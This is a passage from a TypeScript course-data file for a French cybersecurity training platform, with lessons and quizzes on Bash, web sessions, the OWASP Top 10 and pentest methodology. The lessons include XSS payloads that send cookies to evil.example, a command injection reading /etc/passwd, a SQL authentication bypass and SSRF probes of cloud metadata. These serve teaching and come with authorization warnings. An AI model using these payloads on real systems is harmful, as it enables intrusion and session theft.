  nc -z -w1 "$cible" "$port" && echo "$port ouvert"
done

# condition
if [ -f "note.txt" ]; then
  echo "note.txt existe"
fi`),
              p("La concaténation entre guillemets et l'utilisation de $(commande) permettent de capturer la sortie d'une commande dans une variable."),
              callout(
                "Toujours écrire #!/bin/bash en tête et rendre le script exécutable avec chmod +x.",
                "tip"
              ),
            ],
          },
          {
            id: "bash-curl",
            title: "Automatiser avec curl",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("curl est le couteau suisse HTTP du terminal. Combiné à Bash, il automatise l'exploration web."),
              code(`# télécharger toutes les URLs d'une liste
while read url; do
  curl -s -o /dev/null -w "%{http_code} $url\\n" "$url"
done < urls.txt

# envoi d'une requête avec en-têtes et données
curl -s -X POST http://example.com/login \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "username=admin&password=test"

# suivre les redirections et gérer les cookies
curl -s -L -c cookies.txt -b cookies.txt http://example.com/dashboard`),
              p("L'option -w formate la sortie : un moyen propre de boucler sur un grand nombre de cibles et d'enregistrer les réponses."),
            ],
          },
          {
            id: "bash-quiz-1",
            title: "Quiz — Bash",
            type: "quiz",
            duration: "8 min",
            blocks: [
              p("Quiz de validation du module Bash."),
            ],
            quiz: [
              {
                question: "Quel en-tête faut-il en première ligne d'un script Bash ?",
                options: ["#!/bin/sh -e", "#!/bin/bash", "#!/usr/bin/env", "#!/bash"],
                answer: 1,
                explanation: "#!/bin/bash désigne l'interpréteur Bash.",
              },
              {
                question: "Comment capturer la sortie d'une commande dans une variable ?",
                options: ["var={cmd}", "var=$(cmd)", "var=<cmd>", "var=[cmd]"],
                answer: 1,
                explanation: "$(commande) substitue la sortie de la commande.",
              },
              {
                question: "Quelle option curl affiche le code de statut HTTP ?",
                options: ["-s", "-L", "-w '%{http_code}'", "-d"],
                answer: 2,
                explanation: "-w permet de formater la sortie avec %{http_code}.",
              },
              {
                question: "Comment suivre les redirections avec curl ?",
                options: ["-L", "-R", "-f", "-k"],
                answer: 0,
                explanation: "-L / --location suit les redirections HTTP.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "web-security",
    levelId: 4,
    title: "Web Security",
    description:
      "Comprendre l'architecture des applications web, les sessions, les cookies et les premières grandes familles de failles.",
    xp: 1000,
    modules: [
      {
        id: "web-module-1",
        title: "Architecture des applications web",
        lessons: [
          {
            id: "web-http",
            title: "HTTP : requêtes et réponses",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Une application web fonctionne sur un modèle requête/réponse entre un navigateur et un serveur. Le serveur exécute une logique (PHP, Node, Python...) et renvoie du HTML."),
              h("Intervenir sur le trafic"),
              p("Un proxy intercepteur (Burp Suite, mitmproxy, OWASP ZAP) s'intercale entre le navigateur et le serveur pour visualiser et modifier chaque requête : c'est l'outil central du testeur web."),
              code(`# modifier une requête à la volée avec curl
curl -X PUT http://example.com/api/profil \\
  -H "Authorization: Bearer <token>" \\
  -d '{"role": "admin"}'`),
              callout(
                "Ne testez jamais d'applications sans autorisation. Les labs isolés de CyberAcademy existent pour pratiquer légalement.",
                "danger"
              ),
            ],
          },
          {
            id: "web-sessions",
            title: "Sessions & cookies",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("HTTP est sans état : chaque requête est indépendante. Les cookies permettent au serveur d'identifier le visiteur et de maintenir sa session."),
              code(`GET /compte HTTP/1.1
Host: example.com
Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ==`),
              p("L'identifiant de session (session token) doit être imprévisible et lié à la session. S'il est faible, devinable ou dans l'URL, un attaquant peut le voler ou le forger."),
              h("Les attaques liées"),
              list(
                "Vol de cookie : via une faille XSS ou un trafic non chiffré.",
                "Fixation de session : forcer un identifiant connu chez la victime.",
                "Cookie sans drapeaux : un cookie sans Secure ou HttpOnly est plus vulnérable."
              ),
              callout(
                "Un cookie doit porter les drapeaux Secure (HTTPS uniquement) et HttpOnly (inaccessible au JavaScript) pour limiter le vol.",
                "warning"
              ),
            ],
          },
          {
            id: "web-quiz-1",
            title: "Quiz — Web foundations",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module 1.")],
            quiz: [
              {
                question: "Quel outil intercale entre navigateur et serveur pour modifier les requêtes ?",
                options: ["nmap", "Burp Suite", "tcpdump", "Wireshark"],
                answer: 1,
                explanation: "Le proxy intercepteur (Burp Suite, ZAP) capture et modifie le trafic.",
              },
              {
                question: "Comment HTTP mémorise-t-il une session ?",
                options: ["Via les adresses IP", "Via les cookies", "Via le DNS", "Via le port"],
                answer: 1,
                explanation: "Les cookies portent l'identifiant de session entre requêtes.",
              },
              {
                question: "Quel drapeau de cookie le rend inaccessible au JavaScript ?",
                options: ["Secure", "HttpOnly", "SameSite", "Domain"],
                answer: 1,
                explanation: "HttpOnly empêche JavaScript de lire le cookie, limitant le vol via XSS.",
              },
              {
                question: "HTTP est un protocole…",
                options: ["Avec état", "Sans état", "Chiffré", "Bidirectionnel"],
                answer: 1,
                explanation: "HTTP est sans état : l'état est géré par les cookies et sessions.",
              },
            ],
          },
        ],
      },
      {
        id: "web-module-2",
        title: "Premières failles",
        lessons: [
          {
            id: "web-sqli",
            title: "L'injection SQL",
            type: "theory",
            duration: "16 min",
            blocks: [
              p("Une injection SQL survient quand une entrée utilisateur est concaténée dans une requête SQL sans être correctement paramétrée."),
              h("Exemple vulnérable"),
              code(`-- requête construite côté serveur
SELECT * FROM users WHERE login = '$login' AND pass = '$pass'

-- entrée utilisateur malveillante
login = admin' OR '1'='1

-- requête résultante
SELECT * FROM users WHERE login = 'admin' OR '1'='1' AND pass = ''`),
              p("La condition '1'='1' est toujours vraie : la requête renvoie l'utilisateur sans vérifier le mot de passe. C'est un contournement d'authentification classique."),
              h("Les bonnes pratiques"),
              list(
                "Utiliser des requêtes préparées (paramètres liés), jamais la concaténation.",
                "Valider et filtrer les entrées.",
                "Limiter les privilèges du compte SQL applicatif."
              ),
              callout(
                "L'injection est la faute classique des débutants en développement : toujours paramétrer, jamais concaténer.",
                "warning"
              ),
            ],
          },
          {
            id: "web-xss",
            title: "Le Cross-Site Scripting (XSS)",
            type: "theory",
            duration: "16 min",
            blocks: [
              p("Le XSS consiste à injecter du code JavaScript qui sera exécuté dans le navigateur d'un autre utilisateur. La source : une entrée non filtrée affichée dans la page."),
              code(`<!-- entrée : <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
<!-- affichée sans filtrage, le script s'exécute chez la victime -->

<h1>Bienvenue <script>...</script></h1>`),
              h("Les trois formes"),
              list(
                "XSS réfléchi : le payload est dans l'URL, exécuté une fois pour celui qui clique.",
                "XSS stocké : le payload est enregistré sur le serveur et exécuté pour tous les visiteurs (le plus dangereux).",
                "XSS DOM : la faille vit côté client, dans le JavaScript de la page."
              ),
              p("Les conséquences : vol de session, exécution d'actions au nom de la victime, défacement, keylogging."),
              callout(
                "Pour s'en prémunir : encoder toute donnée avant affichage (escaping) et définir une Content-Security-Policy stricte.",
                "tip"
              ),
            ],
          },
          {
            id: "web-quiz-2",
            title: "Quiz — Premières failles",
            type: "quiz",
            duration: "8 min",
            blocks: [p("Quiz de validation du module 2.")],
            quiz: [
              {
                question: "Quelle requête SQL résulte de l'entrée admin' OR '1'='1 ?",
                options: ["SELECT * FROM users", "SELECT * FROM users WHERE login='admin' OR '1'='1'", "SELECT admin", "DELETE FROM users"],
                answer: 1,
                explanation: "La concaténation malveillante modifie la logique de la requête.",
              },
              {
                question: "Comment se protéger proprement de l'injection SQL ?",
                options: ["Échapper les apostrophes", "Utiliser des requêtes préparées", "Hacher les entrées", "Bloquer les guillemets"],
                answer: 1,
                explanation: "Les requêtes préparées séparent le code SQL des données.",
              },
              {
                question: "Quel XSS est stocké sur le serveur et affecte tous les visiteurs ?",
                options: ["Réfléchi", "DOM", "Stocké", "Mutuel"],
                answer: 2,
                explanation: "Le XSS stocké est persisté côté serveur : chaque visiteur l'exécute.",
              },
              {
                question: "Quelle est une conséquence fréquente d'un XSS ?",
                options: ["Vol de session", "Perte de disque", "Attaque réseau", "Ralentissement"],
                answer: 0,
                explanation: "Le XSS peut voler le cookie de session et exécuter des actions au nom de la victime.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "owasp-top-10",
    levelId: 5,
    title: "OWASP Top 10",
    description:
      "Identifier et exploiter les 10 vulnérabilités web majeures : accès cassé, injection, XSS, SSRF et plus encore.",
    xp: 1500,
    modules: [
      {
        id: "owasp-module-1",
        title: "Les vulnérabilités majeures",
        lessons: [
          {
            id: "owasp-idor",
            title: "A01 — Broken Access Control & IDOR",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Le contrôle d'accès cassé est la vulnérabilité n°1 du Top 10. Un utilisateur accède à des ressources ou actions qui ne lui sont pas autorisées."),
              h("L'IDOR (Insecure Direct Object Reference)"),
              p("Quand l'application utilise des identifiants prévisibles sans vérifier l'appartenance : modifier l'ID dans l'URL suffit."),
              code(`GET /api/profil/123  → réponse de l'utilisateur 123
GET /api/profil/124  → si 124 répond, l'accès est cassé`),
              h("Tests à mener"),
              list(
                "Changer les ID dans les URLs et requêtes.",
                "Tester les méthodes HTTP interdites (PUT/DELETE).",
                "Accéder aux ressources après déconnexion.",
                "Élever des privilèges via les en-têtes (X-Forwarded-For, role)."
              ),
              callout(
                "Un contrôle d'accès doit être vérifié côté serveur, jamais seulement côté interface.",
                "warning"
              ),
            ],
          },
          {
            id: "owasp-injection",
            title: "A03 — Injection",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("L'injection couvre SQL, commandes OS, LDAP, XML et templates. Le principe est toujours le même : des données non fiables interprétées comme du code."),
              h("Injection de commandes"),
              code(`# entrée : ; cat /etc/passwd
curl "http://example.com/ping?host=127.0.0.1;cat+/etc/passwd"`),
              p("Si le serveur exécute ping host avec l'entrée brute, le point-virgule permet d'enchaîner des commandes système."),
              h("Prévention"),
              list(
                "Requêtes préparées pour SQL.",
                "API d'exécution sans shell (execve, pas system).",
                "Validation stricte des entrées, listes blanches."
              ),
            ],
          },
          {
            id: "owasp-xss",
            title: "A07 — XSS",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Rappel du niveau précédent : injection de JavaScript dans le navigateur des victimes. Les trois formes sont réfléchi, stocké et DOM."),
              code(`<!-- payload de démonstration (labs uniquement) -->
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('//evil.example/'+document.cookie)">`),
              p("La prévention repose sur l'encodage contextuel (HTML, attribut, script, CSS) et une CSP stricte."),
              callout(
                "Toute donnée utilisateur est hostile tant qu'elle n'a pas été encodée au point de sortie.",
                "danger"
              ),
            ],
          },
          {
            id: "owasp-ssrf",
            title: "A10 — SSRF & autres failles",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Le Server-Side Request Forgery (SSRF) force le serveur à faire des requêtes vers des ressources que l'attaquant ne peut atteindre directement."),
              code(`# le paramètre url est renvoyé par le serveur
GET /proxy?url=http://127.0.0.1:3306
GET /proxy?url=http://169.254.169.254/latest/meta-data/`),
              p("Le serveur interne n'a pas la même politique réseau que l'attaquant : il peut atteindre des services internes ou les métadonnées cloud."),
              h("Les autres entrées du Top 10"),
              list(
                "A02 — Failles cryptographiques : données sensibles non chiffrées, algorithmes faibles.",
                "A04 — Conception non sécurisée : confiance excessive dans le client.",
                "A05 — Mauvaise configuration : défauts, répertoires listables.",
                "A06 — Composants vulnérables : bibliothèques obsolètes.",
                "A08 — Intégrité : désérialisation, mise à jour non vérifiée.",
                "A09 — Journalisation insuffisante : absence de traces exploitables."
              ),
              callout(
                "Le Top 10 évolue chaque année : consultez toujours la version officielle de l'OWASP avant un engagement.",
                "info"
              ),
            ],
          },
          {
            id: "owasp-quiz-1",
            title: "Quiz — OWASP",
            type: "quiz",
            duration: "10 min",
            blocks: [p("Quiz de validation du niveau OWASP.")],
            quiz: [
              {
                question: "Qu'est-ce qu'un IDOR ?",
                options: [
                  "Un chiffrement faible",
                  "Un accès à une ressource via un identifiant prévisible sans vérification",
                  "Une injection de commandes",
                  "Un cookie mal configuré",
                ],
                answer: 1,
                explanation: "L'IDOR exploite des identifiants devinables sans contrôle d'appartenance.",
              },
              {
                question: "Quel caractère enchaîne plusieurs commandes en shell ?",
                options: ["&", ";", "|", "*"],
                answer: 1,
                explanation: "Le point-virgule sépare des commandes successives.",
              },
              {
                question: "Que vise un SSRF ?",
                options: [
                  "Forcer le serveur à requêter des ressources internes",
                  "Injecter du JavaScript",
                  "Voler des cookies via le navigateur",
                  "Bruteforcer des mots de passe",
                ],
                answer: 0,
                explanation: "Le SSRF détourne le serveur comme relais vers des adresses internes.",
              },
              {
                question: "Quelle est la prévention de référence contre les XSS ?",
                options: [
                  "Bloquer les balises script",
                  "Encoder les données au point de sortie + CSP",
                  "Hacher les entrées",
                  "Utiliser HTTPS",
                ],
                answer: 1,
                explanation: "L'encodage contextuel et la CSP neutralisent l'exécution du payload.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "pentesting-methodology",
    levelId: 6,
    title: "Pentesting Methodology",
    description:
      "Structurer une démarche de test d'intrusion complète : de la reconnaissance au reporting, en passant par l'exploitation.",
    xp: 1500,
    modules: [
      {
        id: "pt-module-1",
        title: "La démarche complète",
        lessons: [
          {
            id: "pt-phases",
            title: "Les phases d'un pentest",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("Un test d'intrusion suit un déroulé structuré, défini par des standards comme PTES :"),
              list(
                "1. Cadrage : périmètre, autorisations écrites, règles d'engagement.",
                "2. Reconnaissance : collecte d'informations passives et actives.",
                "3. Énumération : inventaire des services, versions, vulnérabilités.",
                "4. Exploitation : accès initial via une vulnérabilité.",
                "5. Post-exploitation : élévation, mouvement latéral, persistance.",
                "6. Reporting : décrire les failles, leur impact et les remédiations."
              ),
              callout(
                "Sans autorisation écrite, un pentest est un délit. Le cadrage est non négociable et vient TOUJOURS en premier.",
                "danger"
              ),
              h("Règles d'engagement"),
              p("Le contrat définit les systèmes autorisés, les horaires, les techniques interdites et la gestion des données sensibles rencontrées."),
            ],
          },
          {
            id: "pt-recon",
            title: "Reconnaissance & énumération",
            type: "theory",
            duration: "16 min",
            blocks: [
              p("L'énumération est l'étape qui fait gagner un pentest : plus elle est exhaustive, plus l'exploitation est simple."),
              h("Outils de la boîte à outils"),
              code(`# découverte réseau
nmap -sV -sC -p- 10.0.0.5

# énumération web
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d example.com -w subdomains.txt

# services
enum4linux 10.0.0.5     # SMB
smbclient -L //10.0.0.5 # partages`),
              p("Chaque service énuméré révèle une version : confrontez-la aux CVE connues (searchsploit, NVD) pour identifier les exploits candidats."),
              callout(
                "Documentez chaque découverte : la note de pentest (notes) est votre meilleur allié pendant un engagement.",
                "tip"
              ),
            ],
          },
          {
            id: "pt-exploit",
            title: "Exploitation & post-exploitation",
            type: "theory",
            duration: "14 min",
            blocks: [
              p("L'exploitation transforme une vulnérabilité en accès. L'objectif minimal est de démontrer l'impact : lecture d'un fichier, exécution de commandes, contournement d'authentification."),
              h("Post-exploitation"),
              list(
                "Énumération interne : qui sommes-nous, quels droits, quelles accès.",
                "Escalade de privilèges : du service vers root/system ou admin de domaine.",
                "Mouvement latéral : se déplacer vers d'autres machines.",
                "Collecte de preuves d'impact sans endommager le système."
              ),
              p("Sur un engagement complet, l'exploitation est un moyen, pas une fin : la valeur du rapport réside dans l'impact démontré et la remédiation."),
            ],
          },
          {
            id: "pt-reporting",
            title: "Le reporting",
            type: "theory",
            duration: "12 min",
            blocks: [
              p("Le rapport est le livrable final d'un pentest. Il doit être compris par les développeurs ET par la direction."),
              h("Structure d'un rapport"),
              list(
                "Résumé exécutif : l'essentiel en une page, langage métier.",
                "Périmètre et méthodologie.",
                "Synthèse des vulnérabilités avec criticité (CVSS).",
                "Détail par vulnérabilité : description, reproduction pas à pas, impact, remédiation.",
                "Annexes : preuves, captures, outils utilisés."
              ),
              callout(
                "Une vulnérabilité sans preuve de reproduction reproductible perd toute sa crédibilité. Reproduisez toujours, puis documentez.",
                "warning"
              ),
            ],
          },
          {
            id: "pt-quiz-1",
            title: "Quiz — Méthodologie",
            type: "quiz",
            duration: "10 min",
            blocks: [p("Quiz de validation du niveau Méthodologie.")],
            quiz: [
              {
                question: "Quelle étape vient en premier dans un pentest ?",
                options: ["Exploitation", "Cadrage et autorisations", "Énumération", "Reporting"],
                answer: 1,
                explanation: "Le cadrage et l'autorisation écrite précèdent toute action technique.",
              },
              {
                question: "Quel outil énumère les répertoires d'un site web ?",
                options: ["gobuster", "nc", "ssh", "tcpdump"],
                answer: 0,
                explanation: "gobuster brute-force les répertoires et sous-domaines.",
              },
              {
                question: "Que produit l'exploitation d'une vulnérabilité ?",
                options: ["Un rapport", "Un accès ou un impact démontré", "Un scan", "Une redirection"],
                answer: 1,
                explanation: "L'exploitation vise à démontrer un accès ou un impact concret.",
              },
              {
                question: "Que contient le résumé exécutif d'un rapport ?",
                options: [
                  "Tous les commandes utilisées",
                  "L'essentiel en langage métier pour la direction",
                  "Le code des exploits",
                  "Les logs bruts",
                ],
                answer: 1,
                explanation: "Le résumé exécutif s'adresse à un public non technique.",
              },
            ],
          },
        ],
      },
    ],
  },
];

export function getCourse(levelId: number): Course | undefined {
  return COURSES.find((course) => course.levelId === levelId);
}
